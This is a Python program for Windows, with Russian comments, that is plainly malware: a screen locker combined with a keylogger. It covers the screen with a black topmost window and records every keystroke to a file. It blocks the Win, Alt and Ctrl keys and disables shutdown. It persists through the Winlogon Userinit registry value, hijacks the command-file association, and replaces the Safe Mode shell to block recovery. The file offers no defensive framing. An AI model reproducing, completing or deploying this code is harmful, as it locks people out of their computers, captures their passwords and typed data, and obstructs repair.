import keyboard
import winreg
import os
import subprocess
import sys
import win32gui
import win32con
import ctypes
from datetime import datetime
import pyautogui
import threading

# Функция для создания черного экрана
def black_screen():
    # Создаем окно, покрывающее весь экран
    hwnd = win32gui.CreateWindowEx(
        win32con.WS_EX_LAYERED,
        "Static",
        "BlackScreen",
        win32con.WS_POPUP | win32con.WS_VISIBLE,
        0, 0,
        win32gui.GetSystemMetrics(0),  # Ширина экрана
        win32gui.GetSystemMetrics(1),  # Высота экрана
        0, 0, 0, None
    )
    win32gui.SetLayeredWindowAttributes(hwnd, 0, 255, win32con.LWA_COLORKEY)
    win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
    return hwnd

# Функция для перехвата клавиш
def keylogger():
    log_file = "keylog.txt"
    def on_key(event):
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()}: {event.name}\n")
    
    keyboard.on_press(on_key)
    keyboard.wait()  # Бесконечный цикл для перехвата клавиш

# Блокировка клавиш Win, Alt, Ctrl
def block_keys():
    for key in ['left windows', 'right windows', 'alt', 'ctrl']:
        keyboard.block_key(key)

# Отключение стандартных способов выключения
def disable_shutdown():
    # Отключение Alt+F4
    def disable_alt_f4(hwnd, msg, wparam, lparam):
        if msg == win32con.WM_SYSCOMMAND and wparam == win32con.SC_CLOSE:
            return 0
        return win32gui.CallWindowProc(old_window_proc, hwnd, msg, wparam, lparam)
    
    hwnd = win32gui.GetDesktopWindow()
    global old_window_proc
    old_window_proc = win32gui.SetWindowLong(hwnd, win32con.GWL_WNDPROC, disable_alt_f4)
    
    # Отключение меню выключения через реестр
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)

# Добавление в автозагрузку через userinit
def add_to_startup():
    exe_path = os.path.abspath(sys.argv[0])
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, f"C:\\Windows\\System32\\userinit.exe,{exe_path}")
    winreg.CloseKey(key)

# Изменение ассоциации cmd.exe на main.exe
def change_cmd_association():
    key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r"cmdfile\shell\open\command", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f"\"{os.path.abspath(sys.argv[0])}\" %1")
    winreg.CloseKey(key)

# Ограничение безопасного режима и recovery
def restrict_safe_mode():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SafeBoot", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "AlternateShell", 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
    winreg.CloseKey(key)

# Основная функция
def main():
    # Запуск черного экрана
    hwnd = black_screen()
    
    # Запуск keylogger в отдельном потоке
    threading.Thread(target=keylogger, daemon=True).start()
    
    # Блокировка клавиш
    block_keys()
    
    # Отключение способов выключения
    disable_shutdown()
    
    # Добавление в автозагрузку
    add_to_startup()
    
    # Изменение ассоциации cmd
    change_cmd_association()
    
    # Ограничение безопасного режима
    restrict_safe_mode()
    
    # Бесконечный цикл для поддержания программы
    while True:
        pass

if __name__ == "__main__":
    main()